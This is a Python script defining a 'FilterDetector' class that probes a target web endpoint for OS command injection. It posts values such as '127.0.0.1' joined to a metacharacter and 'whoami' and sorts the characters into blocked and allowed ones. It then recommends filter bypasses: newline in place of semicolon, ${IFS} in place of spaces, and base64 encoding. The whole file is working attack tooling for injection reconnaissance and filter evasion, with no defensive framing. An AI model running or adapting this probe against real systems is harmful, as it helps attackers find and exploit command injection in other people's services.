import requests

class FilterDetector:
    """
    Automatically detects which characters/patterns
    are blocked by the target endpoint's filter
    """

    TEST_CHARS = [
        (';',      'Semicolon'),
        ('&&',     'Double Ampersand'),
        ('||',     'Double Pipe'),
        ('|',      'Pipe'),
        ('`',      'Backtick'),
        ('$(',     'Dollar Paren'),
        ('%0a',    'Newline URL encoded'),
        ('\n',     'Raw Newline'),
        ('${IFS}', 'IFS Variable'),
        ('<',      'Less Than'),
        ('>',      'Greater Than'),
        ('*',      'Asterisk'),
        ('?',      'Question Mark'),
        ('../',    'Path Traversal'),
        ('/etc',   'Etc Path'),
    ]

    def probe_endpoint(self, base_url, endpoint, field='host'):
        """
        Probe an endpoint to find what's blocked
        Returns list of blocked and allowed chars
        """
        blocked = []
        allowed = []
        url     = f"{base_url}{endpoint}"

        for char, name in self.TEST_CHARS:
            try:
                resp = requests.post(
                    url,
                    json={field: f'127.0.0.1{char}whoami'},
                    timeout=5
                )
                text = resp.text.lower()

                if any(word in text for word in
                       ['blocked', 'invalid', 'forbidden',
                        'error', 'not allowed']):
                    blocked.append({'char': char, 'name': name})
                else:
                    allowed.append({'char': char, 'name': name})

            except Exception:
                blocked.append({'char': char, 'name': name})

        return {
            'endpoint':    endpoint,
            'blocked':     blocked,
            'allowed':     allowed,
            'filter_type': self._classify_filter(blocked),
            'recommended': self._recommend_bypass(blocked)
        }

    def _classify_filter(self, blocked):
        blocked_chars = [b['char'] for b in blocked]

        if not blocked_chars:
            return 'No Filter Detected'
        if ';' in blocked_chars and '&&' in blocked_chars \
                and '||' in blocked_chars:
            return 'Strong Blacklist Filter'
        if ';' in blocked_chars and '&&' not in blocked_chars:
            return 'Weak Blacklist (semicolon only)'
        if '%0a' not in blocked_chars:
            return 'Bypassable — newline not blocked'
        return 'Moderate Filter'

    def _recommend_bypass(self, blocked):
        blocked_chars = [b['char'] for b in blocked]
        recommendations = []

        if ';' in blocked_chars and '%0a' not in blocked_chars:
            recommendations.append(
                'Use newline bypass (%0a) instead of semicolon')
        if ' ' in blocked_chars and '${IFS}' not in blocked_chars:
            recommendations.append(
                'Use ${IFS} instead of spaces')
        if not blocked_chars:
            recommendations.append(
                'No filter detected — try direct injection')
        if ';' in blocked_chars and '&&' in blocked_chars:
            recommendations.append(
                'Try base64 encoding — most chars blocked')
        if not recommendations:
            recommendations.append(
                'Try URL encoding or base64 bypass')

        return recommendations